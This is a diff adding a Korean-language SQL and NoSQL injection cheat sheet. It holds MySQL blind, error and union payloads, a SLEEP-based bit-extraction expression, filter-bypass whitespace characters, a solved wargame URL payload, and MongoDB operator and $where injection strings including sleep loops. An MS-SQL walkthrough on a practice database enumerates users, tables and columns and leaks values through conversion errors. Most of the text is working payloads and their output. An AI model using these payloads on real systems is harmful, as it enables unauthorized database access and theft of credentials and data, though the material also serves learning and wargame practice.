@@ -1,0 +1,314 @@
+===================================== MySQL Injection ===========================================
+
+- 블라인드 인젝션
+no=1 and 1=1#
+no=1 and 1=2#
+no=1 and 1=1--%20
+no=1 and 1=2--%20
+- 에러 인젝션
+no=0
+no=-1'
+no=-1"
+- union 인젝션
+no=1 order by 1--%20
+no=1' order by 2--%20
+no=1 union select 1--%20
+no=1' union select 1,NULL--%20
+no=1' union select 1,2,NULL,version(),NULL--%20
+no=1' union select 1,2,NULL,(select version()),NULL--%20
+
+no=1 and @@version=1--
+no=1 and (select db_name())=1--
+
+if(substr(LPAD(bin(ascii(substr(pw,"+str(k)+",1))),8,0),"+str(m)+",1) = '1',SLEEP(2),1)
+if(substr(LPAD(bin(ascii(substr(abc,1,1))),8,0),1,1) = '1',SLEEP(2),1)
+ex). char = 'q'
+1). 먼저 찾을 문자를 뽑아낸다.
+- substr(char,1,1)
+2). 뽑은 값을 ascii로 변환시킨다.
+- ascii(substr(char,1,1))
+3). bin 함수를 이용해 binary로 변환시킨다.
+- bin(ascii(substr(char,1,1)))
+4). 8자리를 채워준다.(MySQL은 0011을 11로 출력하기 때문)
+- lpad(bin(ascii(substr(char,1,1))),8,0)
+5). 이를 다시 substr로 한글자씩 뽑아 찾는다.
+substr(lpad(bin(ascii(substr(char,1,))),8,0),1,1)
+
+no = 1 and ascii(substr((select table_name from information_schema.tables limit 0, 1),1,1)) = 65;
+
+※ auto type cast 원리 이해
+MySQL의 자동 형 변환 때문에 해당 현상이 발생함.
+서로 다른 타입의 데이터를 비교하면 MySQL은 2개의 데이터를 같은 타입으로 변환해서 비교함.
+ex). user라는 char 타입의 컬럼이 존재할 때, select * from people where user=0; 과 같이 입력을 하면 모든 결과값 출력.
+select 'a'=0;   #1
+select 'a'=1;   #0
+-> 다음과 같이 'a'=0 에서 'a'문자가 int 0으로 반환되고, 0=0 이 되어 True가 됨.
+
+select '1a'=0;   #0
+select '1a'=1;   #1
+-> 조금 변환해서 앞에 int값을 추가 후 확인을 해보면 반대의 결과를 얻을 수 있었다.('1a' char값은 앞에 '1' 문자만 int 1로 변환되고
+뒤에 'a'문자는 사라지게 된다. 그래서 1 = 1이 되어 True가 출력하게 된다.
+
+select '12a'=0;   #0
+select '12a'=1;   #0
+select '12a'=12;  #1
+-> '12a'는 앞에서 살펴본 것 처럼 int 12로 변환되어 12=12로 True가 되는 것을 확인 가능하다~
+
+ex). los 문제에서 다음과 같이 풀 수 있었음.
+los.eagle-jump.org/nightmare_ce407ee88ba848c2bec8e42aaeaa6ad4.php?pw=')=0;%00
+query : select id from prob_nightmare where pw=('')=0;') and id!='admin'
+-> pw=''=0은 true (pw=0=0)
+
+※ like 사용법
+like '%a' -> 끝자리가 a
+like 'a%' -> 첫자리가 a
+like '%a%' -> a가 들어가면 됨.
+
+※ 공백 우회 문자
+/**/, %20, %2b, +, %09, %0a, %0b, %0c, %0d, %a0
+
+================================== mongo db nosql injection ======================================
+
+$ne : 같지않음
+$not : 복수의 데이터간 여집합을 반환
+$exists : 특정키를 가지고 있는지 질의
+$lt : <
+$gt : >
+$lte : <=
+$gte : >=
+
+or 1 = 1 ====> ||  1==1
+test'}); return {something:1, something:2}}//
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+', $where: '1 == 1'
+1, $where: '1 == 1'
+{ $ne: 1 }
+', $or: [ {}, { 'a':'a
+' } ], $comment:'successful MongoDB injection'
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+|| 1==1
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+{$gt: ''}
+[$ne]=1
+';sleep(5000);
+';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
+{$ne:"hi"}
+
+
+=================================== MS-SQL Injection ========================================
+
+# 테이블명 보기
+sp_tables;
+
+# 서버 버전 확인
+select @@version
+Microsoft SQL Server 2014 - 12.0.2000.8 (Intel X86) 
+	Feb 20 2014 19:20:46 
+	Copyright (c) Microsoft Corporation
+	Express Edition on Windows NT 6.3 <X64> (Build 9600: ) (WOW64) (Hypervisor)
+
+# 시스템에 생성된 테이블 리스트 보기
+select name from sysobjects where type='U'
+select * from information_schema.tables;
+
+# 컬럼 상세 정보
+select * from information_schema.columns where table_name = 'Pilots' order by 5;
+
+# 로컬 변수 선언
+declare @heon datetime
+set @heon =getdate()
+select @heon
+-> 15.03.2019 02:29:19
+
+# 서버 정보 보기
+SELECT @@servername;
+  	(No column name)
+1	VS224373\SQLEXPRESS
+SELECT host_name();
+  	(No column name)
+1	VS224373
+SELECT SERVERPROPERTY('productversion'), SERVERPROPERTY('productlevel');
+  	(No column name)	(No column name)
+1	12.0.2000.8			RTM
+
+# 유저 정보 보기
+SELECT user;
+-> rextester_login
+SELECT current_user;
+-> rextester_login
+SELECT SYSTEM_USER;
+-> rextester_login
+SELECT USER_NAME();
+-> rextester_login
+SELECT USER_NAME(2);
+-> guest
+SELECT SUSER_SNAME();
+-> rextester_login
+SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID;
+-> rextester_login
+SELECT (CASE WHEN (IS_SRVROLEMEMBER('sysadmin')=1) THEN '1' ELSE '0' END);
+-> 0
+
+# 데이터베이스 상세 정보 보기
+SELECT DB_NAME();
+-> rextester
+SELECT DB_NAME(5);
+-> rextester
+SELECT name FROM master..sysdatabases;
+-> 
+	name
+1	master
+2	tempdb
+3	model
+4	msdb
+5	rextester
+
+# table name
+select name from sysobjects where type='U';
+SELECT table_name FROM information_schema.tables;
+  	name
+1	Pilots
+2	Planes
+3	Flights
+4	Pilots_on_flights
+
+SELECT name FROM master..sysobjects WHERE xtype='U';
+
+# columns name
+SELECT column_name FROM information_schema.columns WHERE table_name = 'Pilots';
+  	column_name
+1	ID
+2	First_name
+3	Last_name
+4	Title
+5	Birth_date
+6	Pilots_ID
+
+# no quotes
+SELECT * FROM Users WHERE username = CHAR(97) + CHAR(98) + CHAR(99);
+ascii(substring(select top 1 username from Users,1,1)) = 97;
+
+
+# example
+- Columns 내용 만들기
+insert into Pilots(First_name, Last_name, Title, Birth_date) values('Yoon', 'Kim', 'Hello World', getdate());
+insert into Pilots(First_name, Last_name, Title, Birth_date) values('Heon', 'Yoon', 'abcdefg', getdate());
+insert into Pilots(First_name, Last_name, Title, Birth_date) values('Kang', 'Kee', 'Mos', getdate());
+
+select * from Pilots;
+  	ID	First_name	Last_name	Title	Birth_date	Pilots_ID
+1	797204	Yoon	Kim	Hello 	World	15.03.2019 00:00:00	NULL
+2	797205	Heon	Yoon		abcdefg	15.03.2019 00:00:00	NULL
+3	797206	Kang	Kee			Mos		15.03.2019 00:00:00	NULL
+
+select * from Pilots where First_name='Yoon';
+select * from Pilots where First_name like 'Y%';
+	ID	First_name	Last_name	Title	Birth_date	Pilots_ID
+1	797204	Yoon	Kim	Hello 	World	15.03.2019 00:00:00	NULL
+
+- in 을 사용하여 포함되는 값을 구할 수 있음.
+select * from Pilots where First_name in ('Yoon','Kang');
+  	ID	First_name	Last_name	Title	Birth_date	Pilots_ID
+1	797219	Yoon	Kim	Hello 	World	15.03.2019 00:00:00	NULL
+2	797221	Kang	Kee			Mos		15.03.2019 00:00:00	NULL
+
+select * from Pilots where First_name in ('Yoon','Kang') and Last_name in('kim');
+  	ID	First_name	Last_name	Title	Birth_date	Pilots_ID
+1	797219	Yoon	Kim	Hello 	World	15.03.2019 00:00:00	NULL
+
+- between 을 사용하여 J ~ L로 시작하는 사이의 값들을 구할 수 있음.
+select * from Pilots where First_name between 'J%' and 'L%';
+  	ID	First_name	Last_name	Title	Birth_date	Pilots_ID
+1	797227	Kang	Kee			Mos		15.03.2019 00:00:00	NULL
+
+- 사용자 정의 테이블 추출
+select * from sysobjects where xtype='U';
+  	name	id	crdate	type	userstat	sysstat
+1	Pilots	245575913	07.11.2015 13:52:38	U 	1	3
+2	Planes	293576084	07.11.2015 14:00:38	U 	1	3
+3	Flights	325576198	07.11.2015 14:08:28	U 	1	3
+4	Pilots_on_flights	373576369	07.11.2015 14:12:18			
+
+- 컬럼 이름 추출하기
+select * from syscolumns where id=(select id from sysobjects where name='Pilots');
+  	name		id			xtype	typestat	xusertype	length
+1	ID			245575913	56		1			56			4
+2	First_name	245575913	231		3			231			200
+3	Last_name	245575913	231		3			231			200
+4	Title		245575913	231		3			231			200
+5	Birth_date	245575913	40		1			40			3
+6	Pilots_ID	245575913	56		0			56			4
+
+- error injection으로 테이블명이 Pilots인 것을 획득 가능
+select * from Pilots where First_name='test' and 1 = (select top 1 table_name from information_schema.tables);
+Error(s), warning(s):
+Conversion failed when converting the nvarchar value 'Pilots' to data type int.
+
+- having 1=1; 구문으로 table명이 Pilots이고 첫번째 필드명이 ID라는 것을 알 수 있다.
+select * from Pilots where First_name='test' having 1=1;
+Error(s), warning(s):
+Column 'Pilots.ID' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
+
+- order by ~ having 1=1; 구문으로 두번째 필드명이 First_name인 것을 알 수 있다.
+select * from Pilots where First_name='test' group by Pilots.ID having 1=1;
+Error(s), warning(s):
+Column 'Pilots.First_name' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
+
+- order by ~, ~ having 1=1; 구문으로 세번째 필드명이 Last_name인 것을 알 수 있다.
+select * from Pilots where First_name='test' group by Pilots.First_name, Pilots.ID having 1=1;
+Error(s), warning(s):
+Column 'Pilots.Last_name' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
+
+=> having 1=1 구문을 사용할 수 있다면 이 방식으로 모든 필드명을 추출 가능하다.
+
+- type error를 발생시켜서 First_name 필드는 nvarchar 형식인 것을 알 수 있다.
+select * from Pilots where First_name='test' union select sum(First_name) from Pilots;
+Error(s), warning(s):
+Operand data type nvarchar is invalid for sum operator.
+
+- 타입을 추측해서 풀 수 있다.
+select * from Pilots where First_name='test' union select sum(ID) from Pilots;
+Error(s), warning(s):
+All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
+
+- union select 구문으로 colums 수를 파악 가능하다. (여기서는 컬럼갯수가 6개)
+select * from Pilots where First_name='test' union select 1,1,1,1,1-- ;
+Error(s), warning(s):
+All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
+
+select * from Pilots where First_name='test' union select 1,1,1,1,1,1-- ;
+Error(s), warning(s):
+Operand type clash: int is incompatible with date
+-> 컬럼수가 6개인 것을 확인 가능했는데, date가 형식이 안맞는걸로 보여서 모든 항목에 getdate()를 넣어줘서 찾았다.
+
+select * from Pilots where First_name='test' union select 1,2,3,4,getdate(),6-- ;
+  	ID	First_name	Last_name	Title	Birth_date	Pilots_ID
+1	1	2	3	4	15.03.2019 09:39:23	6
+
+- version 정보를 확인 할 수 있다.
+select * from Pilots where First_name='test' union select 1,2,@@version,4,getdate(),6-- ;
+select * from Pilots where First_name='test' union select 1,2,@@version,4,NULL,6-- ;
+
+- 다음 union select 구문을 이용하여 원하는 First_name을 에러 코드에서 획득 가능하다.
+select * from Pilots where First_name='test' union select min(First_name),1,1,NULL,NULL,NULL from Pilots where First_name > 'a' --;
+Error(s), warning(s):
+Conversion failed when converting the nvarchar value 'Yoon' to data type int.
+
+select * from Pilots where First_name='test' union select min(First_name),1,1,NULL,NULL,NULL from Pilots where First_name > 'Heon' --;
+Error(s), warning(s):
+Conversion failed when converting the nvarchar value 'Kang' to data type int.
+
+select * from Pilots where First_name='test' union select min(First_name),1,1,NULL,NULL,NULL from Pilots where First_name > 'Kang' --;
+Error(s), warning(s):
+Conversion failed when converting the nvarchar value 'Yoon' to data type int.
+
+- 다음 방법으로 password도 획득 가능하다.
+select * from Pilots where First_name='test' union select Last_name,1,1,NULL,NULL,NULL from Pilots where First_name = 'Yoon' ;
+Error(s), warning(s):
+Conversion failed when converting the nvarchar value 'Kim' to data type int.
